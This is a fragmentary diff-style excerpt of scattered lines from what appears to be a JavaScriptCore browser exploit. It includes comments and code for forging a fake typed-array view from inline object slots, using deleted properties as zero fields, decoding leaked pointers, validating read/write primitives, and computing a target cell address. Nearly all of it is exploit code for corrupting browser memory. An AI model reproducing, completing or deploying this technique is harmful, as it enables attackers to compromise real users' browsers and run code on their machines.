@@ -1,0 +1,49 @@
+5:  A six-inline-property JSFinalObject supplies exactly 0x30 controlled bytes at
+12:  The fake byte-writes only the genuine view's m_vector. The genuine view reads a
+16:  the ArrayBuffer through the butterfly and never marks m_vector.
+88:var targetAddress = NaN;
+89:var targetAddressLow = 0;
+90:var targetAddressHigh = 0;
+135:        get: function (target, property, receiver) { return receiver; }
+151:    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
+155:function pointerFromWords(words, offset) {
+156:    if (words[offset + 3] !== 0)
+158:    return words[offset]
+159:        + words[offset + 1] * 0x10000
+160:        + words[offset + 2] * 0x100000000;
+173:    // JSVALUE64 stores a finite double by adding DoubleEncodeOffset (1<<49),
+185:    // visitor retains the backing through the butterfly and ignores m_vector,
+197:    // Object-literal creation is important: six declared properties get the six
+198:    // inline slots. Adding six properties dynamically to {} may spill after two.
+208:    // Deleted inline properties become exact all-zero qwords.
+210:    delete fakeHost.q4; // fake byteOffset
+369:        var rwOffsetZero = true;
+372:                rwOffsetZero = false;
+389:            && rwOffsetZero && rwHeader[0x28] === 0x58;
+420:        scratchWords[0] = targetAddressLow;
+421:        scratchWords[1] = targetAddressHigh;
+447:        var targetOffsetZero = true;
+450:                targetOffsetZero = false;
+465:            && targetHeader[0x1f] === 0 && targetOffsetZero
+500:        // Restore the carrier before dropping the only forged JSValue.
+545:function uint32At(bytes, offset) {
+546:    return bytes[offset]
+547:        + bytes[offset + 1] * 0x100
+548:        + bytes[offset + 2] * 0x10000
+549:        + bytes[offset + 3] * 0x1000000;
+552:function low48At(bytes, offset) {
+553:    return bytes[offset]
+554:        + bytes[offset + 1] * 0x100
+555:        + bytes[offset + 2] * 0x10000
+556:        + bytes[offset + 3] * 0x1000000
+557:        + bytes[offset + 4] * 0x100000000
+558:        + bytes[offset + 5] * 0x10000000000;
+610:    mark("TARGET-CELL", "P=" + hex(targetAddress)
+722:    targetAddress = b0;
+723:    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
+724:    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
+725:    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
+726:        || targetAddressLow < 0 || targetAddressLow > 0xffffffff
+727:        || Math.floor(targetAddressLow) !== targetAddressLow
+728:        || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
+729:        mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
